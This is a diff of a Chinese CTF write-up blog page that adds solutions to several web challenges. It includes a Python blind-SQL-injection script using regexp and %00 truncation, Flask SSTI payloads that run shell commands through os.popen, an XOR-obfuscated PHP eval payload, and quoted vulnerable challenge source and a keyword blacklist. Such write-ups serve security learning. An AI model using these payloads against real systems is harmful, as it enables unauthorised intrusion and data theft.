@@ -25,6 +25,17 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/nctf2015sqli1.png">
 <meta property="og:image" content="http://example.com/img/nctf2019sqli2.png">
+<meta property="og:image" content="http://example.com/img/nctfsqli1.png">
+<meta property="og:image" content="http://example.com/img/nctfsqli20193.png">
+<meta property="og:image" content="http://example.com/img/nctf2019sqli4.png">
+<meta property="og:image" content="http://example.com/img/nctf2019sqli5.png">
+<meta property="og:image" content="http://example.com/img/nctf2019sqli6.png">
+<meta property="og:image" content="http://example.com/img/nctf2019sqli7.png">
+<meta property="og:image" content="http://example.com/img/2019nctfsqli9.png">
+<meta property="og:image" content="http://example.com/img/nctf2019sqli8.png">
+<meta property="og:image" content="http://example.com/img/iluvflask1.png">
+<meta property="og:image" content="http://example.com/img/iluvflask5.png">
+<meta property="og:image" content="http://example.com/img/iluvflask3.png">
 <meta property="og:image" content="http://example.com/img/wdb2018comment1.png">
 <meta property="og:image" content="http://example.com/img/wdb2018comment3.png">
 <meta property="og:image" content="http://example.com/img/wdb2018comment4.png">
@@ -43,21 +54,16 @@
 <meta property="og:image" content="http://example.com/img/wdb2018comment20.png">
 <meta property="og:image" content="http://example.com/img/wdb2018comment21.png">
 <meta property="og:image" content="http://example.com/img/encodeencode1.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish1.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish2.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish3.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish4.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish5.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish6.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish7.png">
-<meta property="og:image" content="http://example.com/img/wdbunfinish8.png">
-<meta property="og:image" content="http://example.com/img/doublescret1.png">
-<meta property="og:image" content="http://example.com/img/doublesecret2.png">
-<meta property="og:image" content="http://example.com/img/doublesecret3.png">
-<meta property="og:image" content="http://example.com/img/ciscndoublesrecreet1.png">
-<meta property="og:image" content="http://example.com/img/doublesecret5.png">
+<meta property="og:image" content="http://example.com/img/truecookbook1.png">
+<meta property="og:image" content="http://example.com/img/truecookbook2.png">
+<meta property="og:image" content="http://example.com/img/rutecookbook4.png">
+<meta property="og:image" content="http://example.com/img/truecookbook5.png">
+<meta property="og:image" content="http://example.com/img/truecookbook6.png">
+<meta property="og:image" content="http://example.com/img/xxewhat2.png">
+<meta property="og:image" content="http://example.com/img/xxewhat1.png">
+<meta property="og:image" content="http://example.com/img/hfctfjustescape1.png">
 <meta property="article:published_time" content="2023-11-29T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-12-11T14:10:47.241Z">
+<meta property="article:modified_time" content="2023-12-15T08:24:11.775Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -230,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          16k 字
+          22k 字
         
       </span>
     
@@ -241,7 +247,7 @@
         
         
         
-          131 分钟
+          187 分钟
         
       </span>
     
@@ -294,11 +300,52 @@
 <p><code>robots.txt</code>下提示<code>hint.txt</code>：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br>If <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure>
 
+<p>查询语句：</p>
+<p><code>sqlquery : select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code></p>
+<p>一开始想用<code>\</code>去转义<code>username</code>的单引号然后用万能密码登录：</p>
+<p><code>\</code>和<code>||1</code>，查询语句会变成：</p>
+<p><code>select * from users where username=&#39;\&#39; and passwd=&#39;||1&#39;</code>,此时用户名就是<code>&#39; and passwd=</code>，后面连一个<code>||1</code>。但不知道后面那个单引号要怎么闭合(注释符被屏蔽掉了)</p>
+<p>看了wp发现还可以用<code>;</code>和<code>%00</code>拼接实现截断：</p>
+<blockquote>
+<p>php &lt; 5.3.4, 且 magic_quotes_gpc &#x3D; Off 时可进行 <code>%00</code> 截断</p>
+</blockquote>
+<p>这里我理解的就是利用<code>;</code>终止了<code>passwd</code>部分的输入，然后再用<code>%00</code>截断后面的单引号</p>
+<p><code>username=123%5C&amp;passwd=||1;%00</code>:</p>
+<p><img src="/img/nctfsqli1.png" srcset="/img/loading.gif" lazyload alt="nctfsqli1"></p>
+<p>重定向到了<code>welcome.php</code>，但实际这东西没法访问。。</p>
+<p><img src="/img/nctfsqli20193.png" srcset="/img/loading.gif" lazyload alt="nctfsqli20193"></p>
+<p><code>regexp</code>注入：<code>正则注入</code>(参考：<code>https://blog.csdn.net/l2872253606/article/details/125265138</code>)</p>
+<p>比如匹配<code>e</code>开头的：</p>
+<p><img src="/img/nctf2019sqli4.png" srcset="/img/loading.gif" lazyload alt="nctf2019sqli4"></p>
+<p>再看看<code>a</code>开头的：</p>
+<p><img src="/img/nctf2019sqli5.png" srcset="/img/loading.gif" lazyload alt="nctf2019sqli5"></p>
+<p>所以我们可以这么判断：</p>
+<p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00</code></p>
+<p><img src="/img/nctf2019sqli6.png" srcset="/img/loading.gif" lazyload alt="nctf2019sqli6"></p>
+<p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></p>
+<p><img src="/img/nctf2019sqli7.png" srcset="/img/loading.gif" lazyload alt="nctf2019sqli7"></p>
+<p>注意两个页面的不同，其实这么搞就有点像盲注了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>url = <span class="hljs-string">&quot;http://662edc83-8269-4f75-93e8-01b69e9c73a2.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_&quot;</span>  <span class="hljs-comment"># 密码字典：小写字母和数字还有下划线</span><br>pw = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># admin的密码</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pw_fuzz:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((pw+i),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        res = requests.post(url=url, data=data).text<br>        <span class="hljs-comment">#print(res)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;welcome.php&quot;</span>  <span class="hljs-keyword">in</span> res:<br>            pw = pw + i<br>            <span class="hljs-built_in">print</span>(pw)<br></code></pre></td></tr></table></figure>
 
+<p>其中<code>\</code>放了两个是因为需要转义，在<code>python</code>中有：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;it\&#x27;s my code&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\\&#x27;</span>)<br><span class="hljs-comment">#it&#x27;s my code</span><br><span class="hljs-comment">#\</span><br></code></pre></td></tr></table></figure>
 
+<p>用<code>parse.unquote(&#39;%00&#39;)</code>为了防止转义<code>%00</code>，比如在登录框直接打<code>%00</code>会被转义成<code>%2500</code>：</p>
+<p><img src="/img/2019nctfsqli9.png" srcset="/img/loading.gif" lazyload alt="2019nctfsqli9"></p>
+<p>当然也有师傅直接用的<code>\x00</code>截断，结果一样的</p>
+<p><img src="/img/nctf2019sqli8.png" srcset="/img/loading.gif" lazyload alt="nctf2019sqli8"></p>
+<p>you_will_never_know7788990</p>
+<p>然后直接登录就行</p>
+<h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p><img src="/img/iluvflask1.png" srcset="/img/loading.gif" lazyload alt="iluvflask1"></p>
+<p>提示<code>FLASK</code>，猜测<code>SSTI</code>,但找不到注入点。。</p>
+<p>这里要用<code>Arjun</code>这个东西把参数扫出来：</p>
+<p><code>arjun -u http://c7d87961-7455-4eaa-8952-5d8c62ab0907.node4.buuoj.cn:81/ -c 100 -d 5 </code></p>
+<p><img src="/img/iluvflask5.png" srcset="/img/loading.gif" lazyload alt="iluvflask5"></p>
+<p>后面就是简单的<code>ssti</code>了而且没啥过滤，就不详细写了</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure>
 
-
-<h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" srcset="/img/loading.gif" lazyload alt="wdb2018comment1"></p>
+<p><img src="/img/iluvflask3.png" srcset="/img/loading.gif" lazyload alt="iluvflask3"></p>
+<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" srcset="/img/loading.gif" lazyload alt="wdb2018comment1"></p>
 <p>没找到啥提示，<code>dirsearch</code>能扫出<code>.git</code>文件，直接访问发现<code>Forbidden</code></p>
 <p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p>
 <p><img src="/img/wdb2018comment3.png" srcset="/img/loading.gif" lazyload alt="wdb2018comment3"></p>
@@ -406,77 +453,166 @@
 
 <p><img src="/img/encodeencode1.png" srcset="/img/loading.gif" lazyload alt="encodeencode1"></p>
 <p>尝试<code>\x</code>开头的失败了。。不知道啥原因，网上的<code>wp</code>都用的<code>unicode</code>并没有用hex。</p>
-<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//检查文件是否为有效的图像文件</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <span class="hljs-comment">//检查文件是否为有效的图像文件</span><br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">//使用的字节值数目不能超过12个</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p><code>strrpos()</code> 函数查找字符串中最后一次出现的位置，然后使用 <code>substr()</code> 函数从该位置的下一个位置开始截取。</p>
 <p>正则匹配了<code>ph</code>(还是&#x2F;i模式)，这样一来php,phtml啥的后缀根本不要想了。<code>mb_strpos()</code> 函数在文件内容中搜索 <code>&lt;?</code> 字符串。如果找到了该字符串，则 <code>mb_strpos()</code> 函数返回字符串的位置，否则返回 <code>false</code>。</p>
-<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p><img src="/img/wdbunfinish1.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish1"></p>
-<p><code>register.php</code></p>
-<p><img src="/img/wdbunfinish2.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish2"></p>
-<p>sb火狐一直弹网站不安全害我注册登录不了。。</p>
-<p><img src="/img/wdbunfinish3.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish3"></p>
-<p>？</p>
-<p>抓包看下传输过程：</p>
-<p><img src="/img/wdbunfinish4.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish4"></p>
-<p>可以看到用户名密码直接明文传过去了，注册界面也一样：</p>
-<p><img src="/img/wdbunfinish5.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish5"></p>
-<p><img src="/img/wdbunfinish6.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish6"></p>
-<p>源码中会显示注册的用户名。</p>
-<p>这里想着没有注入点的话这个用户名能不能利用，去注册<code>a&#39;#</code>发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到<code>login</code>界面的。</p>
-<p>后面注册了一下<code>aa&#39;</code>还是注册不了，又试了一下<code>aa&#39;&#39;</code>发现能注册：</p>
-<p><img src="/img/wdbunfinish7.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish7"></p>
-<p>注意这里，我申请的是<code>aa&#39;&#39;</code>但变成<code>aa&#39;</code>了，有个单引号不知道跑哪里去了？</p>
-<p>单引号能注册大概率是存在转义函数，<code>&#39;&#39;</code>进去变成了<code>\&#39;\&#39;</code>，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。</p>
-<p>先想想吞单引号是怎么回事：</p>
-<p><code>aa&#39;&#39;</code> - &gt; <code>aa\&#39;\&#39; </code> -&gt;  <code>aa&#39;</code></p>
-<p>首先用户名进去肯定被单引号包裹<code>&#39;username&#39;</code>，<code>aa&#39;&#39;</code>进去之后转义成<code>aa\&#39;\&#39;</code>，存到数据库里还是怎么样。回显的时候把<code>aa\&#39;\&#39;</code>这东西给拿出来。那怎么做才会吞掉一个单引号呢？</p>
-<p><code>aa&#39;&#39;&#39;&#39;</code> -&gt; <code>aa&#39;&#39;</code></p>
-<p>后面去找了源码看看：</p>
+<p>参考<code>https://liotree.github.io/2019/08/21/EasyWeb/</code></p>
+<p><code>?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&%80=phpinfo`这东西其实就相当于：
+
+`?_=$&#123;_GET&#125;&#123;函数名&#125;();&函数名=phpinfo`
+
+![suctf2019ezweb1](img/suctf2019ezweb1.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+## [网鼎杯2018]Unfinish
+
+![wdbunfinish1](img/wdbunfinish1.png)
+
+`register.php`
+
+![wdbunfinish2](img/wdbunfinish2.png)
+
+sb火狐一直弹网站不安全害我注册登录不了。。
+
+![wdbunfinish3](img/wdbunfinish3.png)
+
+？
+
+抓包看下传输过程：
+
+![wdbunfinish4](img/wdbunfinish4.png)
+
+可以看到用户名密码直接明文传过去了，注册界面也一样：
+
+![wdbunfinish5](img/wdbunfinish5.png)
+
+![wdbunfinish6](img/wdbunfinish6.png)
+
+源码中会显示注册的用户名。
+
+这里想着没有注入点的话这个用户名能不能利用，去注册`a'#`发现注册不了？应该是触发了什么过滤。正常注册完应该是直接跳到`login`界面的。
+
+后面注册了一下`aa'`还是注册不了，又试了一下`aa''`发现能注册：
+
+![wdbunfinish7](img/wdbunfinish7.png)
+
+注意这里，我申请的是`aa''`但变成`aa'`了，有个单引号不知道跑哪里去了？
+
+单引号能注册大概率是存在转义函数，`''`进去变成了`\'\'`，这里回显的用户名应该是把转义后的拿出来了，后面测试了一下，单数的双引号无法注册，双数的单引号可以成功注册，但会吞掉一半的单引号。
+
+先想想吞单引号是怎么回事：
+
+`aa''` - > `aa\'\' ` ->  `aa'`
+
+首先用户名进去肯定被单引号包裹`'username'`，`aa''`进去之后转义成`aa\'\'`，存到数据库里还是怎么样。回显的时候把`aa\'\'`这东西给拿出来。那怎么做才会吞掉一个单引号呢？
+
+`aa''''` -> `aa''`
+
+后面去找了源码看看：
+
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$email</span> = <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users(email,username,password) values(&#x27;&quot;</span>.<span class="hljs-variable">$email</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&quot;&#x27;)&quot;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username from users where email=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;email&#x27;</span>]).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
 
